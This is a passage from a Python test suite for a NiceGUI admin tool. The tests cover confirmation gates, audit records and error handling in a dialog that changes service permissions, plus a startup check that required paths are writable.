        api.update_service_permissions.assert_not_awaited()
        assert any("no longer passes its confirmation gate" in t for t in _notify_texts(probe.notify))


@pytest.mark.asyncio
async def test_a_second_click_while_a_change_is_in_flight_is_refused(initialized_db, mock_config):
    """disable() is a client round-trip, so two fast clicks both dispatch.

    Without a synchronous in-flight flag that is two concurrent POSTs and two audit files.
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [
            _service_body(["email"]),
            _service_body(["email"]),
            _service_body(["email", "sms"]),
        ]
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))

            second: list = []

            async def reenter(*_a, **_k):
                # Lands while the first run is suspended, exactly as a second websocket
                # click event would.
                second.append(await dialog.submit())

            api.update_service_permissions.side_effect = reenter
            await dialog.submit()

        api.update_service_permissions.assert_awaited_once()
        assert dialog.write_audit.call_count == 1, "a second run would write a second audit file"
        assert "A permission change is already in progress." in _notify_texts(probe.notify)


@pytest.mark.asyncio
async def test_permissions_cancel_clears_state_and_closes(initialized_db, mock_config):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.return_value = _service_body(["email"])
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            dialog.cancel()
            dialog.perms_dialog.close.assert_called_once()
            await dialog.submit()
        assert "No permission changes selected" in _notify_texts(probe.notify)
        api.update_service_permissions.assert_not_awaited()


@pytest.mark.asyncio
async def test_challenge_input_change_after_state_is_cleared_does_not_raise(initialized_db, mock_config):
    """clear_permission_state() assigns perms_challenge_input.value = "" last.

    On a real ui.input that assignment fires the change handler synchronously (verified
    against nicegui 1.4.37: BindableProperty.__set__ invokes _handle_value_change inline,
    and only when the value actually differs). The handler then runs refresh_permission_ui
    against a permission_context that was cleared two lines earlier, so every lookup must
    tolerate a missing key.
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.return_value = _service_body(["email"])
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
            on_challenge_change = dialog.challenge_input.on_value_change.call_args.args[0]
            _handlers_for(dialog.perms_dialog, "hide")[0]()
            on_challenge_change(SimpleNamespace(value=""))
            # And again with the dialog never having been opened at all.
            _handlers_for(dialog.perms_dialog, "hide")[0]()
            on_challenge_change(SimpleNamespace(value="anything"))


def _submit_is_enabled(button):
    """Whether the most recent enable/disable call on the submit button was enable."""
    calls = [c for c in button.mock_calls if c[0] in ("enable", "disable")]
    assert calls, "refresh_permission_ui must always settle the submit button"
    return calls[-1][0] == "enable"


@pytest.mark.asyncio
async def test_leaving_critical_disarms_both_halves_of_the_challenge(initialized_db, mock_config):
    """Toggling out of and back into CRITICAL must re-arm the gate from scratch.

    The erosion this pins: untick a production permission (CRITICAL, acknowledgement box
    appears), satisfy both halves, re-tick the permission so the tier drops to NONE, then
    untick it again. Because the tier drop stops calling rebuild_acknowledgements,
    `acknowledged_for` was left holding the old removed-tuple and the rebuild
    short-circuited on re-entry -- leaving the old acknowledgement ticked. The typed name
    was never cleared either, so both halves of the CRITICAL gate could be found already
    satisfied after a two-click round trip.

    This also exercises the re-entrancy: blanking the challenge input fires its change
    handler, which re-enters refresh_permission_ui, which calls disarm_challenge again.
    It terminates only because a value assignment that does not change the value fires
    nothing (nicegui/binding.py:146-155, mirrored by _ValueMock). A RecursionError here
    is the failure mode.
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.return_value = _service_body(["email", "sms"])
        async for dialog in _build_permissions_dialog(probe, api=api, protected=True):
            await dialog.open_dialog()
            sms = probe.widget_starting_with("checkbox", "SMS notifications")

            # Enter CRITICAL and satisfy both halves.
            sms.value = False
            acks = probe.all_starting_with("checkbox", "I confirm removing 'sms'")
            assert len(acks) == 1
            dialog.challenge_input.value = "VEText"
            acks[0].value = True
            assert _submit_is_enabled(dialog.submit_button), "both halves satisfied should enable submit"

            # Leave CRITICAL. Both halves must be torn down, not merely hidden.
            sms.value = True
            assert dialog.challenge_input.value == ""
            assert probe.all_starting_with("checkbox", "I confirm removing 'sms'")[0].value is True, (
                "the stale widget may survive; what must not survive is its being consulted"
            )

            # Re-enter CRITICAL. A fresh, unticked acknowledgement and a blank name.
            sms.value = False
            acks = probe.all_starting_with("checkbox", "I confirm removing 'sms'")
            assert len(acks) == 2, "re-entering CRITICAL must build a new acknowledgement box"
            assert not acks[1].value
            assert dialog.challenge_input.value == ""
            assert not _submit_is_enabled(dialog.submit_button), "the gate must be re-armed"

            await dialog.submit()

        assert "Complete the confirmation before continuing" in _notify_texts(probe.notify)
        dialog.final_dialog.open.assert_not_called()
        api.update_service_permissions.assert_not_awaited()


@pytest.mark.asyncio
async def test_dialogs_close_only_after_the_last_await(initialized_db, mock_config):
    """Nothing may await between the dialog closes and the end of the handler.

    close() only pushes a prop update; the Quasar "hide" it provokes round-trips back over
    the websocket as a separate event. It therefore cannot interleave into the synchronous
    run of the handler, but it is free to land during any subsequent await -- clearing
    permission_context while later lines still read it. That window is closed by ordering
    rather than reasoned about, so the ordering is what this pins.

    The race itself is not reproducible here (no websocket, and refresh_if_needed is a
    mock), which is precisely why the structural assertion is worth having.
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [
            _service_body(["email"]),
            _service_body(["email"]),
            _service_body(["email", "sms"]),
        ]
        order: list = []
        async for dialog in _build_permissions_dialog(probe, api=api):
            dialog.perms_dialog.close.side_effect = lambda: order.append("perms_dialog.close")
            dialog.final_dialog.close.side_effect = lambda: order.append("final_dialog.close")
            dialog.cache_write.side_effect = lambda **k: order.append("cache_write")
            with patch(
                "app.ui.pages.services.refresh_if_needed",
                new_callable=AsyncMock,
                side_effect=lambda *a, **k: order.append("refresh_if_needed"),
            ):
                await dialog.open_dialog()
                probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
                await dialog.submit()

        assert order == ["cache_write", "refresh_if_needed", "final_dialog.close", "perms_dialog.close"]


@pytest.mark.asyncio
async def test_dismissing_the_dialog_mid_request_does_not_gut_the_audit_record(initialized_db, mock_config):
    """ESC during a slow POST must not blank the audit record's attribution.

    Quasar emits "hide" on ESC and on a backdrop click. That arrives as its own websocket
    message, so it runs clear_permission_state() while apply_permission_change is
    suspended on an await. Re-reading permission_context after that await produced an
    audit record with a blank environment, service_id and service_name and protected
    false -- and rewrite_json_artifact ATOMICALLY REPLACES the good pre-flight record with
    the gutted one, so the rollback array survives but no longer says which service in
    which environment it belongs to.
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [
            _service_body(["email"]),
            _service_body(["email"]),
            _service_body(["email", "sms"]),
        ]
        async for dialog in _build_permissions_dialog(probe, api=api, protected=True):
            await dialog.open_dialog()

            async def dismiss_then_succeed(*_a, **_k):
                # The operator presses ESC while the request is in flight.
                _handlers_for(dialog.perms_dialog, "hide")[0]()

            api.update_service_permissions.side_effect = dismiss_then_succeed

            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            await dialog.submit()

        final = dialog.rewrite_audit.call_args.args[1]
        assert final["outcome"] == "success"
        assert final["environment"] == "development"
        assert final["service_id"] == "svc-1"
        assert final["service_name"] == "VEText"
        assert final["protected"] is True
        assert final["before"] == ["email"]


@pytest.mark.asyncio
async def test_a_lost_protected_flag_is_recorded_as_protected(initialized_db, mock_config):
    """protected is a safety predicate, so an absent value must read as production.

    bool(None) is False, which is the wrong direction: it records a production change as
    unprotected in the one artifact anyone would use to reconstruct what happened.
    """
    from app.ui.permission_helpers import build_audit_payload, diff_permissions

    context: dict = {}
    payload = build_audit_payload(
        environment=context.get("environment", ""),
        service_id="svc-1",
        service_name="VEText",
        diff=diff_permissions(["email"], []),
        protected=bool(context.get("protected", True)),
        base_url="https://api.notifications.va.gov",
    )
    assert payload["protected"] is True


@pytest.mark.asyncio
async def test_a_failure_after_the_request_was_issued_is_reported_to_the_operator(initialized_db, mock_config):
    """finalize_permission_audit raising on the SUCCESS path must not be silent.

    NiceGUI hands an escaping exception to an app exception handler this application never
    registers, so a try/finally with no except leaves the operator with no green notify,
    no cache write and no dialog close -- and a re-submit that then aborts with "the
    service changed since this dialog was opened", which is true and misleading.
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [
            _service_body(["email"]),
            _service_body(["email"]),
            _service_body(["email", "sms"]),
        ]
        with patch("app.ui.pages.services.logger") as log:
            async for dialog in _build_permissions_dialog(probe, api=api):
                await dialog.open_dialog()
                dialog.rewrite_audit.side_effect = OSError("[Errno 28] No space left on device")
                probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
                await dialog.submit()

        api.update_service_permissions.assert_awaited_once()
        texts = _notify_texts(probe.notify)
        assert any("may already have been applied" in t for t in texts), texts
        assert any("No space left on device" in t for t in texts), texts
        log.exception.assert_called_once()
        # The button is released regardless, so the operator is not stuck.
        assert dialog.submit_button.mock_calls[-1][0] == "enable"


@pytest.mark.asyncio
async def test_a_failure_before_anything_was_sent_says_so(initialized_db, mock_config):
    """build_api_client raises RuntimeError for an environment with no configured host."""
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.return_value = _service_body(["email"])
        with (
            patch("app.ui.pages.services.logger") as log,
            patch.object(page_services, "services_table", new_callable=AsyncMock) as table,
            patch("app.ui.pages.services.ensure_admin_auth", new_callable=AsyncMock, return_value=True),
            patch(
                "app.ui.pages.services.build_api_client",
                new_callable=AsyncMock,
                side_effect=[api, RuntimeError("Base URL missing for environment development")],
            ),
            patch("app.ui.pages.services.is_env_protected", new_callable=AsyncMock, return_value=False),
            patch("app.ui.pages.services.get_raw_base_url", new_callable=AsyncMock, return_value="https://x"),
            patch("app.ui.pages.services.write_permission_audit") as write_audit,
            patch("app.ui.pages.services.rewrite_json_artifact"),
            patch("app.ui.pages.services.update_service_permissions_cache", new_callable=AsyncMock),
        ):
            await page_services.services_page()
            table.call_args.args[1].update(
                {
                    "id": "svc-1",
                    "environment_value": "development",
                    "name": "VEText",
                    "_row_key": "svc-1|development",
                }
            )
            await table.call_args.args[3]()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            await probe.widget_starting_with("button", "No changes").on_click.call_args.args[0]()

        texts = _notify_texts(probe.notify)
        assert any("failed before anything was sent" in t and "Base URL missing" in t for t in texts), texts
        write_audit.assert_not_called()
        log.exception.assert_called_once()


@pytest.mark.asyncio
async def test_the_resolved_base_url_is_shown_and_recorded(initialized_db, mock_config):
    """Classification is by environment NAME, but the name-to-URL binding is a DB row.

    An operator can point `dev` at https://api.notifications.va.gov from the Settings
    page. `dev` is on the non-production allowlist, so is_env_protected is False, the
    CRITICAL gate vanishes and the audit says protected: false -- the same fail-open the
    allowlist replaced, reached by a different route. Auto-escalating a listed environment
    that carries a URL override was rejected (pointing dev at a local instance is
    routine), so the mitigation is that the operator SEES where they are pointing, in both
    dialogs and in the record.
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [
            _service_body(["email", "sms"]),
            _service_body(["email", "sms"]),
            _service_body(["email"]),
        ]
        async for dialog in _build_permissions_dialog(
            probe, api=api, protected=True, base_url="https://api.notifications.va.gov"
        ):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=False))

            inline = [w for w in probe.of_kind("label") if "VEText in development" in str(w.text)]
            assert inline, [str(w.text) for w in probe.of_kind("label")]
            assert "development -> https://api.notifications.va.gov" in inline[0].text

            dialog.challenge_input.value = "VEText"
            probe.widget_starting_with("checkbox", "I confirm removing 'sms'").value = True
            await dialog.submit()

            final = [w for w in probe.of_kind("label") if "VEText in development" in str(w.text)]
            assert all("https://api.notifications.va.gov" in w.text for w in final)
            assert len(final) == 2, "the final dialog must show the same host as the inline panel"

            await dialog.execute()

        assert dialog.write_audit.call_args.args[0]["base_url"] == "https://api.notifications.va.gov"
        assert dialog.rewrite_audit.call_args.args[1]["base_url"] == "https://api.notifications.va.gov"


def _status_error(status):
    return httpx.HTTPStatusError(
        "boom",
        request=httpx.Request("GET", "https://example.test/service/svc-1"),
        response=httpx.Response(status, json={"message": "nope"}),
    )


@pytest.mark.asyncio
async def test_permissions_dialog_reports_a_service_missing_its_environment(initialized_db, mock_config):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        svc = {"id": "svc-1", "environment_value": None, "name": "VEText", "_row_key": "svc-1|"}
        async for dialog in _build_permissions_dialog(probe, api=api, service=svc):
            await dialog.open_dialog()
        assert "Selected service is missing required details" in _notify_texts(probe.notify)
        api.get_service.assert_not_called()


@pytest.mark.asyncio
async def test_permissions_dialog_bails_when_credentials_are_missing(initialized_db, mock_config):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        with (
            patch.object(page_services, "services_table", new_callable=AsyncMock) as table,
            patch("app.ui.pages.services.ensure_admin_auth", new_callable=AsyncMock, return_value=False),
            patch("app.ui.pages.services.build_api_client", new_callable=AsyncMock, return_value=api),
        ):
            await page_services.services_page()
            table.call_args.args[1].update(
                {"id": "svc-1", "environment_value": "development", "name": "VEText", "_row_key": "k"}
            )
            await table.call_args.args[3]()
        api.get_service.assert_not_called()
        assert not probe.of_kind("dialog")[1].open.called


@pytest.mark.asyncio
async def test_apply_bails_when_credentials_disappear_between_open_and_submit(initialized_db, mock_config):
    """ensure_admin_auth is re-checked before the write, not trusted from dialog open."""
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.return_value = _service_body(["email"])
        with (
            patch.object(page_services, "services_table", new_callable=AsyncMock) as table,
            patch(
                "app.ui.pages.services.ensure_admin_auth",
                new_callable=AsyncMock,
                side_effect=[True, False],
            ),
            patch("app.ui.pages.services.build_api_client", new_callable=AsyncMock, return_value=api),
            patch("app.ui.pages.services.is_env_protected", new_callable=AsyncMock, return_value=False),
            patch("app.ui.pages.services.get_raw_base_url", new_callable=AsyncMock, return_value="https://x"),
            patch("app.ui.pages.services.write_permission_audit") as write_audit,
            patch("app.ui.pages.services.rewrite_json_artifact"),
            patch("app.ui.pages.services.update_service_permissions_cache", new_callable=AsyncMock),
        ):
            await page_services.services_page()
            table.call_args.args[1].update(
                {"id": "svc-1", "environment_value": "development", "name": "VEText", "_row_key": "k"}
            )
            await table.call_args.args[3]()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            await probe.widget_starting_with("button", "No changes").on_click.call_args.args[0]()

        api.update_service_permissions.assert_not_awaited()
        write_audit.assert_not_called()


@pytest.mark.asyncio
async def test_open_read_401_hands_off_to_handle_unauthorized(initialized_db, mock_config):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = _status_error(401)
        with patch("app.ui.pages.services.handle_unauthorized") as unauth:
            async for dialog in _build_permissions_dialog(probe, api=api):
                await dialog.open_dialog()
        unauth.assert_called_once()
        dialog.perms_dialog.open.assert_not_called()


@pytest.mark.asyncio
async def test_open_read_404_names_the_service_and_the_environment(initialized_db, mock_config):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = _status_error(404)
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
        assert any("was not found in development" in t for t in _notify_texts(probe.notify))
        dialog.perms_dialog.open.assert_not_called()


@pytest.mark.asyncio
async def test_open_read_other_status_surfaces_the_api_message(initialized_db, mock_config):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = _status_error(500)
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
        assert any("Failed to read service" in t for t in _notify_texts(probe.notify))


@pytest.mark.asyncio
async def test_open_read_transport_failure_is_named_as_such(initialized_db, mock_config):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = httpx.ConnectError("no route to host")
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
        assert any("Could not reach the notification API" in t for t in _notify_texts(probe.notify))


@pytest.mark.asyncio
async def test_open_read_unexpected_failure_is_still_surfaced(initialized_db, mock_config):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = ValueError("not json")
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
        assert any("Error reading service: not json" in t for t in _notify_texts(probe.notify))


@pytest.mark.asyncio
async def test_concurrency_reread_transport_failure_does_not_send(initialized_db, mock_config):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [_service_body(["email"]), httpx.ConnectError("gone")]
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            await dialog.submit()
        assert any("Could not re-read the service before updating" in t for t in _notify_texts(probe.notify))
        api.update_service_permissions.assert_not_awaited()
        dialog.write_audit.assert_not_called()


@pytest.mark.parametrize(
    "status,expected",
    [
        (403, "Not authorized to update this service"),
        (404, "not found in development"),
        (400, "Failed to update permissions"),
    ],
)
@pytest.mark.asyncio
async def test_update_status_errors_are_reported_and_audited(initialized_db, mock_config, status, expected):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [_service_body(["email"]), _service_body(["email"])]
        api.update_service_permissions.side_effect = _status_error(status)
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            await dialog.submit()
        assert any(expected in t for t in _notify_texts(probe.notify)), _notify_texts(probe.notify)
        final = dialog.rewrite_audit.call_args.args[1]
        assert final["outcome"] == "error"
        assert final["before"] == ["email"]
        dialog.cache_write.assert_not_awaited()


@pytest.mark.asyncio
async def test_update_401_hands_off_to_handle_unauthorized(initialized_db, mock_config):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [_service_body(["email"]), _service_body(["email"])]
        api.update_service_permissions.side_effect = _status_error(401)
        with patch("app.ui.pages.services.handle_unauthorized") as unauth:
            async for dialog in _build_permissions_dialog(probe, api=api):
                await dialog.open_dialog()
                probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
                await dialog.submit()
        unauth.assert_called_once()
        assert dialog.rewrite_audit.call_args.args[1]["outcome"] == "error"


@pytest.mark.asyncio
async def test_update_transport_failure_is_audited_as_an_error(initialized_db, mock_config):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [_service_body(["email"]), _service_body(["email"])]
        api.update_service_permissions.side_effect = httpx.ConnectError("gone")
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            await dialog.submit()
        assert any("Could not reach the notification API" in t for t in _notify_texts(probe.notify))
        assert dialog.rewrite_audit.call_args.args[1]["outcome"] == "error"


@pytest.mark.asyncio
async def test_update_unexpected_failure_is_audited_as_an_error(initialized_db, mock_config):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [_service_body(["email"]), _service_body(["email"])]
        api.update_service_permissions.side_effect = ValueError("not json")
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            await dialog.submit()
        assert any("Error updating permissions: not json" in t for t in _notify_texts(probe.notify))
        assert dialog.rewrite_audit.call_args.args[1]["outcome"] == "error"


@pytest.mark.asyncio
async def test_verification_read_failure_tells_the_operator_to_re_read(initialized_db, mock_config):
    """The POST landed. Not knowing what it did is the dangerous state, so say so."""
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [
            _service_body(["email"]),
            _service_body(["email"]),
            httpx.ConnectError("gone"),
        ]
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            await dialog.submit()
        texts = _notify_texts(probe.notify)
        assert any("verification read failed" in t for t in texts), texts
        final = dialog.rewrite_audit.call_args.args[1]
        assert final["outcome"] == "error"
        assert "verification read failed" in final["error"]
        dialog.cache_write.assert_not_awaited()


@pytest.mark.asyncio
async def test_a_protected_additive_change_is_red_but_needs_no_typed_challenge(initialized_db, mock_config):
    """T2: production, additive only. Red styling, itemized, but no challenge apparatus."""
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [
            _service_body(["email"]),
            _service_body(["email"]),
            _service_body(["email", "sms"]),
        ]
        async for dialog in _build_permissions_dialog(probe, api=api, protected=True):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            assert dialog.submit_button.props.call_args.args[0] == "color=negative"
            assert not probe.all_starting_with("checkbox", "I confirm removing")
            await dialog.submit()
            dialog.final_dialog.open.assert_not_called()

        api.update_service_permissions.assert_awaited_once_with("svc-1", ["email", "sms"])
        assert dialog.write_audit.call_args.args[0]["protected"] is True


@pytest.mark.asyncio
async def test_a_stale_cache_row_is_reported_next_to_the_success(initialized_db, mock_config):
    """A green "verified" beside a table still showing the old set is a misread waiting."""
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [
            _service_body(["email"]),
            _service_body(["email"]),
            _service_body(["email", "sms"]),
        ]
        async for dialog in _build_permissions_dialog(probe, api=api):
            dialog.cache_write.return_value = False
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            await dialog.submit()
        assert any("Run sync to refresh the table" in t for t in _notify_texts(probe.notify))


@pytest.mark.asyncio
async def test_a_nameless_service_says_why_the_challenge_cannot_be_completed(initialized_db, mock_config):
    """validate_typed_challenge correctly refuses a blank expected name.

    Left alone that renders as "Type the service name exactly: " with submit disabled
    forever and nothing for the operator to act on. Correct, and undiagnosable.
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.return_value = {"id": "svc-1", "name": "", "permissions": ["email", "sms"]}
        svc = {"id": "svc-1", "environment_value": "development", "name": "", "_row_key": "k"}
        async for dialog in _build_permissions_dialog(probe, api=api, protected=True, service=svc):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=False))
            hints = [w for w in probe.of_kind("label") if "cannot be satisfied" in str(w.text)]
            assert hints, [str(w.text) for w in probe.of_kind("label")]
            assert not _submit_is_enabled(dialog.submit_button)
            await dialog.submit()
        api.update_service_permissions.assert_not_awaited()


class TestStartupWritabilityCheck:
    def test_required_paths_include_the_db_dir_artifacts_and_nicegui_storage(self, tmp_path):
        with (
            patch.object(_st.config, "database_path", str(tmp_path / "sub" / "app.db")),
            patch.dict(os.environ, {"NICEGUI_STORAGE_PATH": "/somewhere/.nicegui"}),
        ):
            paths = _st.required_writable_paths()

        assert str(tmp_path / "sub") in paths
        assert "data/permission_changes" in paths
        assert "data/send_response" in paths
        assert "/somewhere/.nicegui" in paths

    def test_nicegui_storage_defaults_to_the_cwd_relative_directory(self):
        env = {k: v for k, v in os.environ.items() if k != "NICEGUI_STORAGE_PATH"}
        with patch.dict(os.environ, env, clear=True):
            assert ".nicegui" in _st.required_writable_paths()

    def test_passes_silently_when_everything_is_writable(self):
        with patch.object(_st, "describe_unwritable_paths", return_value=[]):
            _st.check_required_paths_writable()

    def test_raises_naming_every_bad_path_and_the_remediation(self):
        with patch.object(
            _st,
            "describe_unwritable_paths",
            return_value=["/app/data: cannot create files", "/app/.nicegui: cannot create files"],
        ):
            with pytest.raises(RuntimeError) as exc:
                _st.check_required_paths_writable()

        message = str(exc.value)
        assert "/app/data" in message
        assert "/app/.nicegui" in message
        # The remediation is the whole point -- both previous incidents were root-owned
        # bind mounts, and the fix is not guessable from a PermissionError.
        assert "chown" in message
        assert "APP_UID" in message

    @pytest.mark.asyncio
    async def test_startup_runs_the_check_before_touching_the_database(self):
        """Wiring test. Without it, deleting the call from startup() breaks nothing --
        verified by mutation: the check itself stayed green while the app lost it.
        Order matters too: create_all() is what fails cryptically on an unwritable dir.
        """
        calls = []
        with (
            patch.object(_st, "check_required_paths_writable", side_effect=lambda: calls.append("check")),
            patch.object(_st, "create_all", new=AsyncMock(side_effect=lambda: calls.append("create_all"))),
            patch.object(_st, "ensure_default_hosts", new=AsyncMock()),
            patch.object(_st, "migrate_plaintext_users_to_encrypted", new=AsyncMock()),
        ):
            await _st.startup()

        assert calls == ["check", "create_all"]

    @pytest.mark.asyncio
    async def test_startup_aborts_when_the_check_fails(self):
        with (
            patch.object(_st, "check_required_paths_writable", side_effect=RuntimeError("boom")),
            patch.object(_st, "create_all", new=AsyncMock()) as create_all,
        ):
            with pytest.raises(RuntimeError, match="boom"):
                await _st.startup()

        create_all.assert_not_awaited()
